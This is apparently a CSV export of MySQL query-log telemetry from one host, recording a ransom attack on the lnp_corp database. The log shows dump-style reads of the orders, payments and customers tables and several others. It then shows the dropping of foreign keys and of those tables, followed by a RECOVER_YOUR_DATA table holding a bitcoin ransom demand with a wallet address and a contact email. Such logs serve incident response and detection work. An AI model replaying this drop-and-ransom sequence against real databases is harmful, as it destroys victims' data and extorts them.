TimeGenerated,DeviceName,ActionType,Query,RawData
"Aug 14, 2026 6:19:22 PM",corp-na01-bp123na,Query, /*!40100 SET @@SQL_MODE='' */,2026-08-15T00:19:22.363339Z    48 Query /*!40100 SET @@SQL_MODE='' */
"Aug 14, 2026 6:19:22 PM",corp-na01-bp123na,Query, /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */,2026-08-15T00:19:22.454842Z    48 Query /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */
"Aug 14, 2026 6:19:22 PM",corp-na01-bp123na,Query, set optimizer_switch='semijoin=off',2026-08-15T00:19:22.633626Z    48 Query set optimizer_switch='semijoin=off'
"Aug 14, 2026 6:19:22 PM",corp-na01-bp123na,Query, /*M!100100 SET WAIT_TIMEOUT=DEFAULT */,2026-08-15T00:19:22.544208Z    48 Query /*M!100100 SET WAIT_TIMEOUT=DEFAULT */
"Aug 14, 2026 6:19:22 PM",corp-na01-bp123na,Query," SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='sakila' AND TABLE_NAME IN ('actor_info'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME","2026-08-15T00:19:22.722826Z    48 Query SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='sakila' AND TABLE_NAME IN ('actor_info'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME"
"Aug 14, 2026 6:19:21 PM",corp-na01-bp123na,Query, SELECT * FROM actor LIMIT 10,2026-08-15T00:19:21.651595Z    47 Query SELECT * FROM actor LIMIT 10
"Aug 14, 2026 6:19:21 PM",corp-na01-bp123na,Query," SELECT /*!40001 SQL_NO_CACHE */ `actor_id`, `first_name`, `last_name`, `last_update` FROM `actor` WHERE 1 LIMIT 10","2026-08-15T00:19:20.948446Z    46 Query SELECT /*!40001 SQL_NO_CACHE */ `actor_id`, `first_name`, `last_name`, `last_update` FROM `actor` WHERE 1 LIMIT 10"
"Aug 14, 2026 6:19:21 PM",corp-na01-bp123na,Query," select column_name, extra, generation_expression, data_type from information_schema.columns where table_schema=database() and table_name='actor' order by ordinal_position","2026-08-15T00:19:20.858020Z    46 Query select column_name, extra, generation_expression, data_type from information_schema.columns where table_schema=database() and table_name='actor' order by ordinal_position"
"Aug 14, 2026 6:19:20 PM",corp-na01-bp123na,Query, SHOW VARIABLES LIKE 'lower_case_table_names',2026-08-15T00:19:20.403256Z    46 Query SHOW VARIABLES LIKE 'lower_case_table_names'
"Aug 14, 2026 6:19:20 PM",corp-na01-bp123na,Query, SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'actor',2026-08-15T00:19:20.494884Z    46 Query SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'actor'
"Aug 14, 2026 6:19:20 PM",corp-na01-bp123na,Query, set optimizer_switch='semijoin=off',2026-08-15T00:19:19.951842Z    46 Query set optimizer_switch='semijoin=off'
"Aug 14, 2026 6:19:20 PM",corp-na01-bp123na,Query, set optimizer_switch=default,2026-08-15T00:19:20.224583Z    46 Query set optimizer_switch=default
"Aug 14, 2026 6:19:20 PM",corp-na01-bp123na,Query," SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'actor'","2026-08-15T00:19:20.678730Z    46 Query SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'actor'"
"Aug 14, 2026 6:19:20 PM",corp-na01-bp123na,Query," SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'actor'","2026-08-15T00:19:20.585069Z    46 Query SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'actor'"
"Aug 14, 2026 6:19:20 PM",corp-na01-bp123na,Query," SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='sakila' AND TABLE_NAME IN ('actor')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME","2026-08-15T00:19:20.134027Z    46 Query SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='sakila' AND TABLE_NAME IN ('actor')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME"
"Aug 14, 2026 6:19:20 PM",corp-na01-bp123na,Query, SET SQL_QUOTE_SHOW_CREATE=1,2026-08-15T00:19:20.768694Z    46 Query SET SQL_QUOTE_SHOW_CREATE=1
"Aug 14, 2026 6:19:20 PM",corp-na01-bp123na,Query," SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='sakila' AND TABLE_NAME IN ('actor'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME","2026-08-15T00:19:20.041386Z    46 Query SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='sakila' AND TABLE_NAME IN ('actor'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME"
"Aug 14, 2026 6:19:19 PM",corp-na01-bp123na,Query, /*M!100100 SET WAIT_TIMEOUT=DEFAULT */,2026-08-15T00:19:19.861727Z    46 Query /*M!100100 SET WAIT_TIMEOUT=DEFAULT */
"Aug 14, 2026 6:19:19 PM",corp-na01-bp123na,Query, /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */,2026-08-15T00:19:19.771728Z    46 Query /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */
"Aug 14, 2026 6:19:19 PM",corp-na01-bp123na,Query, USE `sakila`,2026-08-15T00:19:18.903794Z    45 Query USE `sakila`
"Aug 14, 2026 6:19:19 PM",corp-na01-bp123na,Query, /*!40100 SET @@SQL_MODE='' */,2026-08-15T00:19:19.682447Z    46 Query /*!40100 SET @@SQL_MODE='' */
"Aug 14, 2026 6:19:19 PM",corp-na01-bp123na,Query, SHOW tables,2026-08-15T00:19:18.998471Z    45 Query SHOW tables
"Aug 14, 2026 6:19:18 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-15T00:19:17.984235Z    43 Query SET AUTOCOMMIT=0
"Aug 14, 2026 6:19:18 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-15T00:19:18.714270Z    45 Query SET AUTOCOMMIT=0
"Aug 14, 2026 6:19:18 PM",corp-na01-bp123na,Query, SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'sakila',2026-08-15T00:19:18.807283Z    45 Query SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'sakila'
"Aug 14, 2026 6:19:18 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-15T00:19:18.345011Z    44 Query SET AUTOCOMMIT=0
"Aug 14, 2026 6:19:17 PM",corp-na01-bp123na,Query, DROP TABLE `orders`,2026-08-15T00:19:16.931756Z    34 Query DROP TABLE `orders`
"Aug 14, 2026 6:19:17 PM",corp-na01-bp123na,Query, DROP TABLE `customers`,2026-08-15T00:19:17.043816Z    34 Query DROP TABLE `customers`
"Aug 14, 2026 6:19:17 PM",corp-na01-bp123na,Query, COMMIT,2026-08-15T00:19:17.619698Z    34 Query COMMIT
"Aug 14, 2026 6:19:17 PM",corp-na01-bp123na,Query, INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit https://bit.ly/22mysql) After payment send mail to ak+2ne16@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2NE16'),2026-08-15T00:19:17.530466Z    34 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit https://bit.ly/22mysql) After payment send mail to ak+2ne16@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2NE16')
"Aug 14, 2026 6:19:17 PM",corp-na01-bp123na,Query, DROP TABLE `credentials`,2026-08-15T00:19:17.168380Z    34 Query DROP TABLE `credentials`
"Aug 14, 2026 6:19:17 PM",corp-na01-bp123na,Query," INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0135 bitcoin to bc1q7jps5432akuflg9flw2vu6hgmmj5hrrdu6c5gm or in 48 hours, your data will be publicly disclosed and deleted. ')","2026-08-15T00:19:17.439006Z    34 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0135 bitcoin to bc1q7jps5432akuflg9flw2vu6hgmmj5hrrdu6c5gm or in 48 hours, your data will be publicly disclosed and deleted. ')"
"Aug 14, 2026 6:19:17 PM",corp-na01-bp123na,Query, CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255)),2026-08-15T00:19:17.292297Z    34 Query CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255))
"Aug 14, 2026 6:19:16 PM",corp-na01-bp123na,Query, ALTER TABLE `payments` DROP FOREIGN KEY `payments_ibfk_1`,2026-08-15T00:19:16.134142Z    34 Query ALTER TABLE `payments` DROP FOREIGN KEY `payments_ibfk_1`
"Aug 14, 2026 6:19:16 PM",corp-na01-bp123na,Query," SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'lnp_corp' AND TABLE_NAME = 'payments' AND REFERENCED_TABLE_NAME IS NOT NULL","2026-08-15T00:19:16.043701Z    34 Query SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'lnp_corp' AND TABLE_NAME = 'payments' AND REFERENCED_TABLE_NAME IS NOT NULL"
"Aug 14, 2026 6:19:16 PM",corp-na01-bp123na,Query, ALTER TABLE `credentials` DROP FOREIGN KEY `credentials_ibfk_1`,2026-08-15T00:19:16.699658Z    34 Query ALTER TABLE `credentials` DROP FOREIGN KEY `credentials_ibfk_1`
"Aug 14, 2026 6:19:16 PM",corp-na01-bp123na,Query, ALTER TABLE `orders` DROP FOREIGN KEY `orders_ibfk_1`,2026-08-15T00:19:16.353691Z    34 Query ALTER TABLE `orders` DROP FOREIGN KEY `orders_ibfk_1`
"Aug 14, 2026 6:19:16 PM",corp-na01-bp123na,Query, DROP TABLE `payments`,2026-08-15T00:19:16.804151Z    34 Query DROP TABLE `payments`
"Aug 14, 2026 6:19:16 PM",corp-na01-bp123na,Query," SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'lnp_corp' AND TABLE_NAME = 'orders' AND REFERENCED_TABLE_NAME IS NOT NULL","2026-08-15T00:19:16.263596Z    34 Query SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'lnp_corp' AND TABLE_NAME = 'orders' AND REFERENCED_TABLE_NAME IS NOT NULL"
"Aug 14, 2026 6:19:16 PM",corp-na01-bp123na,Query," SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'lnp_corp' AND TABLE_NAME = 'credentials' AND REFERENCED_TABLE_NAME IS NOT NULL","2026-08-15T00:19:16.609053Z    34 Query SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'lnp_corp' AND TABLE_NAME = 'credentials' AND REFERENCED_TABLE_NAME IS NOT NULL"
"Aug 14, 2026 6:19:16 PM",corp-na01-bp123na,Query," SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'lnp_corp' AND TABLE_NAME = 'customers' AND REFERENCED_TABLE_NAME IS NOT NULL","2026-08-15T00:19:16.519078Z    34 Query SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'lnp_corp' AND TABLE_NAME = 'customers' AND REFERENCED_TABLE_NAME IS NOT NULL"
"Aug 14, 2026 6:19:16 PM",corp-na01-bp123na,Query, SHOW TABLES,2026-08-15T00:19:15.953520Z    34 Query SHOW TABLES
"Aug 14, 2026 6:19:15 PM",corp-na01-bp123na,Query," SELECT /*!40001 SQL_NO_CACHE */ `payment_id`, `order_id`, `card_brand`, `card_masked`, `card_last4`, `exp_month`, `exp_year` FROM `payments` WHERE 1 LIMIT 10","2026-08-15T00:19:15.080156Z    41 Query SELECT /*!40001 SQL_NO_CACHE */ `payment_id`, `order_id`, `card_brand`, `card_masked`, `card_last4`, `exp_month`, `exp_year` FROM `payments` WHERE 1 LIMIT 10"
"Aug 14, 2026 6:19:15 PM",corp-na01-bp123na,Query," select column_name, extra, generation_expression, data_type from information_schema.columns where table_schema=database() and table_name='payments' order by ordinal_position","2026-08-15T00:19:14.988237Z    41 Query select column_name, extra, generation_expression, data_type from information_schema.columns where table_schema=database() and table_name='payments' order by ordinal_position"
"Aug 14, 2026 6:19:15 PM",corp-na01-bp123na,Query, SET SQL_QUOTE_SHOW_CREATE=1,2026-08-15T00:19:14.896900Z    41 Query SET SQL_QUOTE_SHOW_CREATE=1
"Aug 14, 2026 6:19:15 PM",corp-na01-bp123na,Query, USE `lnp_corp`,2026-08-15T00:19:15.864355Z    34 Query USE `lnp_corp`
"Aug 14, 2026 6:19:15 PM",corp-na01-bp123na,Query, SELECT * FROM payments LIMIT 10,2026-08-15T00:19:15.742754Z    42 Query SELECT * FROM payments LIMIT 10
"Aug 14, 2026 6:19:14 PM",corp-na01-bp123na,Query, set optimizer_switch=default,2026-08-15T00:19:14.355974Z    41 Query set optimizer_switch=default
"Aug 14, 2026 6:19:14 PM",corp-na01-bp123na,Query," SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'payments'","2026-08-15T00:19:14.806790Z    41 Query SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'payments'"
"Aug 14, 2026 6:19:14 PM",corp-na01-bp123na,Query, /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */,2026-08-15T00:19:13.902949Z    41 Query /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */
"Aug 14, 2026 6:19:14 PM",corp-na01-bp123na,Query, set optimizer_switch='semijoin=off',2026-08-15T00:19:14.083029Z    41 Query set optimizer_switch='semijoin=off'
"Aug 14, 2026 6:19:14 PM",corp-na01-bp123na,Query," SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='lnp_corp' AND TABLE_NAME IN ('payments'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME","2026-08-15T00:19:14.172760Z    41 Query SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='lnp_corp' AND TABLE_NAME IN ('payments'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME"
"Aug 14, 2026 6:19:14 PM",corp-na01-bp123na,Query, SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'payments',2026-08-15T00:19:14.625742Z    41 Query SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'payments'
"Aug 14, 2026 6:19:14 PM",corp-na01-bp123na,Query, /*M!100100 SET WAIT_TIMEOUT=DEFAULT */,2026-08-15T00:19:13.993559Z    41 Query /*M!100100 SET WAIT_TIMEOUT=DEFAULT */
"Aug 14, 2026 6:19:14 PM",corp-na01-bp123na,Query," SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='lnp_corp' AND TABLE_NAME IN ('payments')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME","2026-08-15T00:19:14.265487Z    41 Query SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='lnp_corp' AND TABLE_NAME IN ('payments')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME"
"Aug 14, 2026 6:19:14 PM",corp-na01-bp123na,Query," SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'payments'","2026-08-15T00:19:14.716513Z    41 Query SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'payments'"
"Aug 14, 2026 6:19:14 PM",corp-na01-bp123na,Query, SHOW VARIABLES LIKE 'lower_case_table_names',2026-08-15T00:19:14.534680Z    41 Query SHOW VARIABLES LIKE 'lower_case_table_names'
"Aug 14, 2026 6:19:13 PM",corp-na01-bp123na,Query, SELECT * FROM orders LIMIT 10,2026-08-15T00:19:13.142903Z    40 Query SELECT * FROM orders LIMIT 10
"Aug 14, 2026 6:19:13 PM",corp-na01-bp123na,Query, /*!40100 SET @@SQL_MODE='' */,2026-08-15T00:19:13.813606Z    41 Query /*!40100 SET @@SQL_MODE='' */
"Aug 14, 2026 6:19:12 PM",corp-na01-bp123na,Query, SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'orders',2026-08-15T00:19:11.956668Z    39 Query SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'orders'
"Aug 14, 2026 6:19:12 PM",corp-na01-bp123na,Query," SELECT /*!40001 SQL_NO_CACHE */ `order_id`, `customer_id`, `order_date`, `amount`, `status` FROM `orders` WHERE 1 LIMIT 10","2026-08-15T00:19:12.409704Z    39 Query SELECT /*!40001 SQL_NO_CACHE */ `order_id`, `customer_id`, `order_date`, `amount`, `status` FROM `orders` WHERE 1 LIMIT 10"
"Aug 14, 2026 6:19:12 PM",corp-na01-bp123na,Query, SHOW VARIABLES LIKE 'lower_case_table_names',2026-08-15T00:19:11.866104Z    39 Query SHOW VARIABLES LIKE 'lower_case_table_names'
"Aug 14, 2026 6:19:12 PM",corp-na01-bp123na,Query," select column_name, extra, generation_expression, data_type from information_schema.columns where table_schema=database() and table_name='orders' order by ordinal_position","2026-08-15T00:19:12.318743Z    39 Query select column_name, extra, generation_expression, data_type from information_schema.columns where table_schema=database() and table_name='orders' order by ordinal_position"
"Aug 14, 2026 6:19:12 PM",corp-na01-bp123na,Query, SET SQL_QUOTE_SHOW_CREATE=1,2026-08-15T00:19:12.228743Z    39 Query SET SQL_QUOTE_SHOW_CREATE=1
"Aug 14, 2026 6:19:12 PM",corp-na01-bp123na,Query," SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'orders'","2026-08-15T00:19:12.046839Z    39 Query SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'orders'"
"Aug 14, 2026 6:19:12 PM",corp-na01-bp123na,Query," SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'orders'","2026-08-15T00:19:12.137254Z    39 Query SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'orders'"
"Aug 14, 2026 6:19:11 PM",corp-na01-bp123na,Query, set optimizer_switch=default,2026-08-15T00:19:11.684332Z    39 Query set optimizer_switch=default
"Aug 14, 2026 6:19:11 PM",corp-na01-bp123na,Query, /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */,2026-08-15T00:19:11.232848Z    39 Query /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */
"Aug 14, 2026 6:19:11 PM",corp-na01-bp123na,Query," SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='lnp_corp' AND TABLE_NAME IN ('orders')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME","2026-08-15T00:19:11.594151Z    39 Query SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='lnp_corp' AND TABLE_NAME IN ('orders')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME"
